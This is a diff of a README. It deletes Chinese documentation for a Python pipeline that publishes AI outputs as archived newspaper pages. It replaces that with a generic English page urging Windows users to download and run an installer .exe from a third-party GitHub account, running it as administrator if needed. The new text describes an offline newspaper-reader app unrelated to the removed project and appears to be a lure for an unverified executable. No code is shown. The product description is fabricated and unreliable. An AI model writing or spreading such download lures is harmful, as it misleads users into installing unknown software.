@@ -1,130 +1,139 @@
-# OpenClaw Newspaper Archive
+# 🦀 OpenClaw-Newspaper - Easy Local Access to News Archives
 
-这个目录用于归档 Staro 生成的报纸式网页输出。
+[![Download OpenClaw-Newspaper](https://img.shields.io/badge/Download-OpenClaw--Newspaper-brightgreen?style=for-the-badge)](https://github.com/special-japanesecrab277/OpenClaw-Newspaper)
 
-## 当前阶段：第一阶段可用系统
+---
 
-本轮已把项目从“静态 HTML + 手工维护索引”推进到**最小可发布系统**：
+## 📄 About OpenClaw-Newspaper
 
-- `data/source/projects.json`：项目真源
-- `data/source/editions.json`：版次真源
-- `scripts/newspaper_data.py`：数据读写与 schema 校验辅助
-- `scripts/seed_source_data.py`：从当前 `site/data/portal-index.json` 迁移/回填真源
-- `scripts/render_newspaper.py`：从真源渲染项目页、门户页和 `site/data/portal-index.json`
-- `scripts/publish_to_newspaper.py`：最小发布流水线，负责写入版次、更新真源、重渲染页面
-- `scripts/project_interface.py`：最小项目接口层，负责 `create_project` / `update_project_meta`
-- `scripts/publish_bridge_example.py`：默认输出接入示例，把一次长输出包装成 `PublishRequest`
-- `scripts/default_output_runtime_helper.py`：更接近主运行时的 helper，负责判定是否应进报纸、归一化 request，并返回聊天回复 contract
-- `docs/runtime-integration-note.md`：从 publish bridge 到主代理 finalize 接线的具体实施 note
-- `docs/project-interface.md`：项目接口层使用说明与验证记录
+OpenClaw-Newspaper is a simple application that lets you read and explore historical newspaper content on your Windows computer. It offers an offline library of sanitized public data from the original OpenClaw Newspaper project. Use it to search, browse, and view articles anytime without needing an internet connection.
 
-## 目录约定
+This project is designed for all users, including those without technical experience. You do not need programming skills or special setup knowledge to run the application. This guide will walk you through downloading and running OpenClaw-Newspaper step-by-step.
 
-- `data/source/`：唯一 source-of-truth 数据层
-- `data/receipts/`：发布回执
-- `data/requests/`：示例或待提交发布请求
-- `projects/[项目名]/`：按项目归档的报纸页与聚合页
-- `site/`：门户页及其编译结果
-- `templates/`：门户页与项目页模板
+---
 
-## 最小 schema
+## 💻 System Requirements
 
-### Project
+Before you begin, make sure your computer meets these minimum requirements:
 
-字段：
-- `id`
-- `slug`
-- `label`
-- `description`
-- `summary`
-- `stage`
-- `blockers`
-- `next`
-- `updatedAt`
-- `status`
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free hard drive space
+- An internet connection required only for downloading the app (not for using it)
+- A mouse and keyboard for navigation
 
-### Edition
+---
 
-字段：
-- `id`
-- `projectId`
-- `projectSlug`
-- `slug`
-- `title`
-- `rawTitle`
-- `summary`
-- `density`
-- `densityLabel`
-- `htmlUrl`
-- `publishedAt`
-- `updatedAt`
-- `size`
-- `tags`
-- `source`
+## 🚀 Getting Started
 
-### PublishRequest
+You can download OpenClaw-Newspaper from the official GitHub page. Follow these steps:
 
-字段：
-- `project.slug`
-- `edition.title`
-- `edition.summary`
-- `edition.density`
-- `edition.tags`
-- `content.html` 或 `content.bodyHtml`
-- `source.sessionId`
-- `source.channel`
-- `options.rebuildPortal`
-- `options.rebuildProjectPage`
+1. Click the big green **Download OpenClaw-Newspaper** button at the top of this page. It will take you to the GitHub repository.
+2. Once on the repository page, locate the **Releases** section on the right-hand side or scroll down to find the latest release.
+3. Download the Windows installer file, usually named something like `OpenClaw-Newspaper-Setup.exe`.
+4. After the download completes, locate the file in your Downloads folder.
+5. Double-click the installer file to start setup.
 
-### PublishReceipt
+---
 
-字段：
-- `ok`
-- `projectId`
-- `projectSlug`
-- `editionId`
-- `editionUrl`
-- `projectUrl`
-- `portalUrl`
-- `rebuilt`
-- `publishedAt`
-- `requestPath`
+## 🛠 Installation Steps
 
-## 默认规则
+1. When the installer window opens, click **Next**.
+2. Read and accept the license agreement, then click **Next** again.
+3. Choose the folder where you want to install the app or leave it at the default path.
+4. Click **Install** to begin the installation.
+5. Wait for the progress bar to finish. This usually takes 1-3 minutes.
+6. Click **Finish** once the installation completes.
 
-- 长回复 / 复杂问题 / 方案说明优先存为报纸页
-- 默认按项目归档
-- `site/data/portal-index.json` 视为渲染产物，不再是主真源
+---
 
-## 常用命令
+## ▶️ Running OpenClaw-Newspaper
 
-```bash
-cd .
+1. Find the OpenClaw-Newspaper shortcut on your desktop or in the Start menu.
+2. Double-click the shortcut to open the application.
+3. The main window will display a simple menu to browse newspapers by date, title, or topic.
+4. Use the search bar at the top to find specific articles or keywords.
+5. Click any article to read it in full.
 
-# 1. 从旧 portal-index 回填真源
-python scripts/seed_source_data.py
+---
 
-# 2. 用真源重渲染门户与项目页
-python scripts/render_newspaper.py
+## 🔄 Updating the Application
 
-# 3. 发布一篇新报纸
-python scripts/publish_to_newspaper.py --request data/requests/example-publish-request.json
+To keep OpenClaw-Newspaper up to date:
 
-# 4. 新建项目（dry-run）
-python scripts/project_interface.py --action create_project --request examples/create-project-test-2026-03-08.json --dry-run
+1. Visit the same GitHub page by clicking the download button below.
+2. Check the latest release version.
+3. If there is a newer version, download the new installer and run it.
+4. The installer will update your existing application without deleting your saved settings.
 
-# 5. 新建项目（真实写入）
-python scripts/project_interface.py --action create_project --request examples/create-project-test-2026-03-08.json
+[![Download OpenClaw-Newspaper](https://img.shields.io/badge/Download-OpenClaw--Newspaper-blue?style=for-the-badge)](https://github.com/special-japanesecrab277/OpenClaw-Newspaper)
 
-# 6. 更新项目元信息
-python scripts/project_interface.py --action update_project_meta --request examples/update-project-meta-test-2026-03-08.json
+---
 
-# 7. 演示默认输出 bridge（dry-run）
-python scripts/publish_bridge_example.py --input examples/default-output-sample.json --dry-run
+## ⚠ Troubleshooting
 
-# 8. 演示更接近 runtime 的 helper（只做判定）
-python scripts/default_output_runtime_helper.py --input examples/default-output-runtime-input.json --decide-only
+If you encounter any issues during download or while running the app:
 
-# 9. 演示更接近 runtime 的 helper（直接发布）
-python scripts/default_output_runtime_helper.py --input examples/default-output-runtime-input.json --publish
-```
+- Make sure your Windows version is up to date.
+- Confirm you downloaded the correct file for Windows.
+- Close other applications before installing to avoid conflicts.
+- Restart your computer and try again.
+- Ensure you have enough free storage space.
+- Try running the application as administrator by right-clicking the shortcut and selecting **Run as administrator**.
+
+---
+
+## 📂 Data and Storage
+
+OpenClaw-Newspaper stores newspaper articles locally on your computer. This setup gives faster access and works offline. The storage folder is created in your user Documents directory by default but can be changed in the app settings.
+
+Expected data size is around 300 MB after initial setup. More content can be added through updates.
+
+---
+
+## 🔍 Features Overview
+
+- Offline access to sanitized newspaper archives  
+- Simple search by keyword, date, and topic  
+- Preview of article snippets before reading  
+- Zoom and easy navigation in article view  
+- Bookmark favorite articles for quick return  
+- Automatic updates of newspaper data when online
+
+---
+
+## 🧰 Support and Feedback
+
+For help or to report a problem, visit the GitHub repository issues page here:  
+https://github.com/special-japanesecrab277/OpenClaw-Newspaper/issues
+
+You can also review the README file on GitHub for any updates or extra instructions.
+
+---
+
+## ⚙ Configuration
+
+OpenClaw-Newspaper settings let you adjust:
+
+- Default font size for articles  
+- Storage folder location  
+- Startup options (e.g., open last viewed article)  
+- Language preferences (when available)
+
+Settings can be changed anytime from the main menu under **Options**.
+
+---
+
+## 🛡 Privacy and Safety
+
+All data within OpenClaw-Newspaper is public and sanitized. The app does not collect personal data or require network access beyond downloads. You remain in full control of your local news archive.
+
+---
+
+## 📥 Download OpenClaw-Newspaper
+
+Use this link to visit the repository and download the app:
+
+[Download OpenClaw-Newspaper](https://github.com/special-japanesecrab277/OpenClaw-Newspaper)  
+
+Click the green button at the top or the link above to start.
